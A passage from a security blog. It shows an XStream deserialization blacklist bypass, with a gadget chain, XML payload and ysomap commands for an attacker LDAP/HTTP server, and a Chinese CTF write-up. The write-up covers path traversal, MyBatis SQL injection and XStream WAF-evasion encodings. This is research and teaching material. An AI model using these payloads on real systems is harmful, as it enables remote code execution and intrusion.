class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.org.apache.xpath.internal.objects.XString"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>when you try to reproduce this vulnerablity, you should change the line 37’s content. For example, changing the <code>ldap://localhost:1099/EvilObj</code> to <code>ldap://your-evil-ldap-server:port/Namespace</code></p><h1 id="3-Analysis"><a href="#3-Analysis" class="headerlink" title="#3 Analysis"></a>#3 Analysis</h1><p>First of all, XStream can deserialize a tag with <code>&lt;sorted-set&gt;</code> using the TreeSet/TreeMapConverter. And the recover process will call some object’s <code>compareTo</code> function and not in the default blacklist.</p><p>So I try to find a Object with <code>compareTo</code> function. Using <code>javax.naming.ldap.Rdn$RdnEntry.compareTo()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(RdnEntry that)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> diff = type.compareToIgnoreCase(that.type);</span><br><span class="line">    <span class="keyword">if</span> (diff != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> diff;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (value.equals(that.value)) &#123;     <span class="comment">// try shortcut</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getValueComparable().compareTo(</span><br><span class="line">      that.getValueComparable());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The field <code>value</code> is a <code>Object</code> type, so we can use any type of class to transfer the chain.</p><p>Using <code>com.sun.org.apache.xpath.internal.objects.XString.equal()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">null</span> == obj2)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// In order to handle the 'all' semantics of</span></span><br><span class="line">    <span class="comment">// nodeset comparisons, we always call the</span></span><br><span class="line">    <span class="comment">// nodeset function.</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">    <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> str().equals(obj2.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The line 15 call the <code>obj2.toString</code> function, and not check the <code>obj2</code>‘s type. So we can find a anytype class with <code>toString</code> function.</p><p>Using <code>javax.swing.MultiUIDefaults.toString()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    buf.append(<span class="string">"&#123;"</span>);</span><br><span class="line">    Enumeration keys = keys();</span><br><span class="line">    <span class="keyword">while</span> (keys.hasMoreElements()) &#123;</span><br><span class="line">        Object key = keys.nextElement();</span><br><span class="line">        buf.append(key + <span class="string">"="</span> + get(key) + <span class="string">", "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> length = buf.length();</span><br><span class="line">    <span class="keyword">if</span> (length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        buf.delete(length-<span class="number">2</span>, length);</span><br><span class="line">    &#125;</span><br><span class="line">    buf.append(<span class="string">"&#125;"</span>);</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The line 7 trigger the <code>get</code> function.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Object value = <span class="keyword">super</span>.get(key);</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UIDefaults table : tables) &#123;</span><br><span class="line">        value = (table != <span class="keyword">null</span>) ? table.get(key) : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And on <code>get</code>function, the line 9 call the <code>javax.swing.UIDefaults.get()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Object value = getFromHashtable( key );</span><br><span class="line">    <span class="keyword">return</span> (value != <span class="keyword">null</span>) ? value : getFromResourceBundle(key, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Next, the line 2 trigger the <code>getFromHashtable</code> function.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getFromHashtable</span><span class="params">(<span class="keyword">final</span> Object key)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">        value = <span class="keyword">super</span>.get(key);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> (value <span class="keyword">instanceof</span> LazyValue) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/* If an exception is thrown we'll just put the LazyValue</span></span><br><span class="line"><span class="comment">                 * back in the table.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                value = ((LazyValue)value).createValue(<span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>When <code>value</code> is <code>LazyValue</code> type, trigger the <code>javax.swing.UIDefaults$LazyValue.createValue()</code>.</p><p>Next, I found a implementation of <code>LazyValue</code> which can call any static method using reflection.</p><p>Using <code>sun.swing.SwingLazyValue.createValue()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">createValue</span><span class="params">(<span class="keyword">final</span> UIDefaults table)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(className);</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(className, <span class="keyword">true</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (methodName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Class[] types = getClassArray(args);</span><br><span class="line">            Method m = c.getMethod(methodName, types);</span><br><span class="line">            makeAccessible(m);</span><br><span class="line">            <span class="keyword">return</span> m.invoke(c, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class[] types = getClassArray(args);</span><br><span class="line">            Constructor constructor = c.getConstructor(types);</span><br><span class="line">            makeAccessible(constructor);</span><br><span class="line">            <span class="keyword">return</span> constructor.newInstance(args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// Ideally we would throw an exception, unfortunately</span></span><br><span class="line">        <span class="comment">// often times there are errors as an initial look and</span></span><br><span class="line">        <span class="comment">// feel is loaded before one can be switched. Perhaps a</span></span><br><span class="line">        <span class="comment">// flag should be added for debugging, so that if true</span></span><br><span class="line">        <span class="comment">// the exception would be thrown.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The line 4 to 9 will call a class’s static method, so we should find a static method which can do something evil.</p><p>I found the <code>javax.naming.InitialContext.doLookup()</code> method is a good choice.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">doLookup</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (T) (<span class="keyword">new</span> InitialContext()).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This method could launch a JNDI connection. So we can set up a evil LDAP/RMI server to execute arbitrary code we wanted.</p><p>For example, using my tool <code>ysomap</code> to set up a LDAP server and evil http server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// set up a evil http server</span><br><span class="line">use exploit SimpleHTTPServer</span><br><span class="line">use payload EvilFileWrapper</span><br><span class="line">use bullet ClassWithEvilConstructor</span><br><span class="line">set lport 8088</span><br><span class="line">set path /EvilObj.class</span><br><span class="line">set classname EvilObj</span><br><span class="line">set body &quot;open -a Calculator&quot;</span><br><span class="line">set type class</span><br><span class="line">run</span><br><span class="line">// set up a evil LDAP server</span><br><span class="line">use exploit LDAPRefListener</span><br><span class="line">set lport 1099</span><br><span class="line">set codebase http://localhost:8088/</span><br><span class="line">set objectName EvilObj</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/images/xstream_blacklist_bypass/image-20210105110226086.png" alt="image-20210105110226086"></p><p>Then, try to deserialze the payload, you will get a calculator XD</p><p><img src="/images/xstream_blacklist_bypass/image-20210105110507762.png" alt="image-20210105110507762"></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xnuca2020 easyjava设计思路</title>
      <link href="2020/11/02/ctf-xnuca-2020-easyjava/"/>
      <url>2020/11/02/ctf-xnuca-2020-easyjava/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。</p><a id="more"></a><p>具体的考点如下：</p><ol><li>任意文件下载，/proc/self/fd的利用</li><li>mybatis缓存反序列化漏洞，<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a></li><li>xstream反序列化利用，简单正则waf绕过，类比fastjson unicode编码绕过</li><li>高版本java版本下的jndi利用</li></ol><h2 id="0x01-预期题解"><a href="#0x01-预期题解" class="headerlink" title="0x01 预期题解"></a>0x01 预期题解</h2><p>题目本身设计的功能点比较少，主要是jpg图片签名，下载和验签功能</p><h3 id="1-源码获取"><a href="#1-源码获取" class="headerlink" title="#1 源码获取"></a>#1 源码获取</h3><p>这里首先关注下载的接口</p><p><img src="/images/xnuca-2020-easyjava/image-20201102151033808.png" alt="image-20201102151033808"></p><p>在返回包里存在Check字段，于get请求中的sign字段是一样的内容，尝试修改filename为<code>../../../../../../etc/passwd</code></p><p><img src="/images/xnuca-2020-easyjava/image-20201102151347649.png" alt="image-20201102151347649"></p><p><img src="/images/xnuca-2020-easyjava/image-20201102151503000.png" alt="image-20201102151503000"></p><p>check字段返回了不一样的内容，这里判断可能sign值用于校验，通过才返回结果，那么修改sign字段，即可获取到当前请求的内容。接下来，由于是linux系统，我们可以通过暴力fd值来获取到当前运行的jar包内容，如<code>/proc/self/fd/4</code>来获取jar包</p><h3 id="2-mybatis-SQL注入"><a href="#2-mybatis-SQL注入" class="headerlink" title="#2 mybatis SQL注入"></a>#2 mybatis SQL注入</h3><p>拿到jar反编译后先看pom，其中比较容易关注的主要是两个jar包，一个是mybatis的springboot包，另一个是xstream的包</p><p><img src="/images/xnuca-2020-easyjava/image-20201102152300777.png" alt="image-20201102152300777"></p><p>如果关注cve动态的话，可以知道最近刚出的漏洞<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a>，虽然mybatis的版本已经进行了升级，但spring的mybatis包中的mybatis依赖并没有升级，仍然是3.5.5版本，再确定一下，是否启用了cache</p><p><img src="/images/xnuca-2020-easyjava/image-20201102152617085.png" alt="image-20201102152617085"></p><p>从mapper对应的xml配置里可以看到开启了cache配置，并且<code>findByHashAndSecret</code>接口存在注入。</p><p>到这里就简单了，我们只要找一下，调用点确认是否可控，即可确认是否存在注入</p><p><code>nese.game.controller.CheckController</code>存在链路，从文件中获取内容，并进行数据库查询，所以这边我们能达到一个注入的效果</p><p><img src="/images/xnuca-2020-easyjava/image-20201102153339331.png" alt="image-20201102153339331"></p><h3 id="3-mybatis二级缓存反序列化漏洞"><a href="#3-mybatis二级缓存反序列化漏洞" class="headerlink" title="#3 mybatis二级缓存反序列化漏洞"></a>#3 mybatis二级缓存反序列化漏洞</h3><p>接下来，继续进行审计，关注一下另一个点xstream包的安全问题。在<code>nese.game.entity.Picture</code>对象上，调用了xstream的fromXML函数，并且在<code>readObject</code>函数处对字符串类型的xml进行还原</p><p><img src="/images/xnuca-2020-easyjava/image-20201102154259827.png" alt="image-20201102154259827"></p><p>到这里就比较清晰了，我们需要利用前面发现的SQL注入点，进行注入构造任意的xml数据</p><p>并利用mybatis的默认二级缓存使用serialization的原理（如下图官方文档所示），来触发xstream反序列化漏洞</p><p><img src="/images/xnuca-2020-easyjava/image-20201102155335403.png" alt="image-20201102155335403"></p><p>接下来，就根据题目的签名实现，来注入任意数据，以如下代码为例，生成存在注入语句的jpg文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    String payload = &quot;evil xml&quot;;</span><br><span class="line">    File file = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    File dest = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    InputStream inputStream = new FileInputStream(file);</span><br><span class="line">    byte[] bytes = new byte[(int)file.length()];</span><br><span class="line">    inputStream.read(bytes);</span><br><span class="line">    InputStream destInputStream = new FileInputStream(dest);</span><br><span class="line">    String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);</span><br><span class="line">&#125;catch (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交后可以看到具体的效果，重复提交两次，即可触发xml的反序列化</p><p><img src="/images/xnuca-2020-easyjava/image-20201102155950724.png" alt="image-20201102155950724"></p><h3 id="4-XStream正则waf绕过"><a href="#4-XStream正则waf绕过" class="headerlink" title="#4 XStream正则waf绕过"></a>#4 XStream正则waf绕过</h3><p>从题目上来看，XStream的实现需要绕过两个点：</p><ol><li><p>PureJavaReflectionProvider</p><p>PureJavaReflectionProvider不支持不存在无参构造函数的类的还原，以及该类如果是可序列化的，那么它的readObject不能有类属性上的还原。这是因为PureJavaReflectionProvider对于反序列化的操作，并非是一个递归的过程，有空再写这个分析：）</p></li><li><p>正则waf</p><p>题目并没有遵循XStream官方的类禁用方法，而是采用正则的方式先对待反序列化的xml字符串进行检测，检测通过后再进行反序列化。</p></li></ol><p>关于第一个点，比较容易解决，参考marshalsec对于spring jndi利用链的实现，该链符合我说的要求</p><p>而对于第二个点，这里没有用官方的方法，提示了我们需要对字符串上做些操作来绕过正则waf。我们参考fastjson的<code>@type</code>的unicode编码绕过方式，再看看是否对于XStream，也同样存在这种问题？</p><p>答案是肯定的，介绍一下XStream的编码绕过：</p><ol><li><p>针对标签黑名单的绕过</p><p>以spring jndi利用链为案例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当前黑名单为<code>org[.]springframework</code>，此时的绕过方法可以为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的原理在于xstream会对符合格式的16进制做转换</p><p><code>com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName</code></p><p><code>com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; length; i++ ) &#123;</span><br><span class="line">  <span class="keyword">char</span> c = name.charAt(i);</span><br><span class="line">  <span class="keyword">if</span> (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123;</span><br><span class="line">    i += dollarReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'$'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123;</span><br><span class="line">    <span class="comment">// 处理hex格式的标签内容，其正确格式为_.xxxx</span></span><br><span class="line">    i += hexPrefix.length();</span><br><span class="line">    c = (<span class="keyword">char</span>)Integer.parseInt(name.substring(i, i + <span class="number">4</span>), <span class="number">16</span>);</span><br><span class="line">    i += <span class="number">3</span>;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == escapeReplacementFirstChar</span><br><span class="line">             &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123;</span><br><span class="line">    i += escapeCharReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'_'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从dollarReplacement，hexPrefix，escapeCharReplacement三者来看，最终不影响我们绕过的为16进制的处理<code>_.xxxx</code>转换成实际的字符。</p></li><li><p>针对标签属性内容的绕过</p><p>案例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时的黑名单为<code>custom</code>，那么绕过方法可以为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"cust<span class="symbol">&amp;#111;</span>m"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>原理为读取属性内容时，会做符合要求的转化</p><p><code>com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue</code></p><p>该函数内容比较多，不贴出来了，从883行到942行均在处理html编码格式，并将其转化为实际的字符</p><p>所以这里<code>&amp;#111;</code>将转化为<code>o</code></p></li><li><p>针对标签内容的绕过</p><p>案例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ldap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时的黑名单为<code>ldap://</code>，可以用如下的几种方法绕过</p><p><strong>a. html编码</strong></p><p>这部分在提取数据时，同样对html编码的内容做了转化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;#108;</span>dap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这部分跟上面<code>标签属性内容的绕过</code>的一样，不再叙述</p><p><strong>b. 注释的方法</strong></p><p>在处理实际的标签内容时，遇到注视内容将被忽略掉</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ld<span class="comment">&lt;!-- test --&gt;</span>ap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField</code></p><p><code>com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  Event event = readEvent();</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.type == TEXT) &#123; <span class="comment">// 处理字符</span></span><br><span class="line">      String text = event.value;</span><br><span class="line">      <span class="keyword">if</span> (text != <span class="keyword">null</span> &amp;&amp; text.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (last == <span class="keyword">null</span>) &#123;</span><br><span class="line">          last = text;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (buffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer = <span class="keyword">new</span> StringBuffer(last);</span><br><span class="line">          &#125;</span><br><span class="line">          buffer.append(text);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.type != COMMENT) &#123;<span class="comment">// 非字符 且 不是注释时 跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = readEvent(); <span class="comment">// 继续</span></span><br><span class="line">  &#125;</span><br><span class="line">  reset();</span><br><span class="line">  <span class="keyword">if</span> (buffer != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (last == <span class="keyword">null</span>) ? <span class="string">""</span> : last;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面的代码中来看，这里主要在对字符进行拼接，并且遇到注释时将跳过，所以如果在内容中添上注释也能达到绕过的效果</p></li></ol><p>经过上面XStream类型解析分析，我们可以构造出绕过正则waf的payload来</p><h3 id="5-高版本JNDI注入的利用"><a href="#5-高版本JNDI注入的利用" class="headerlink" title="#5 高版本JNDI注入的利用"></a>#5 高版本JNDI注入的利用</h3><p>在生成具体的exp后，可以对外发起JNDI连接，到这一步，我们需要去判断其为高版本jdk还是低版本的jdk。如果是低版本的jdk，我们可以直接利用codebase加载任意的class来达到命令执行的效果，而高版本的jdk只能依赖本地ObjectFactory或本地利用链来进行攻击，参考<a 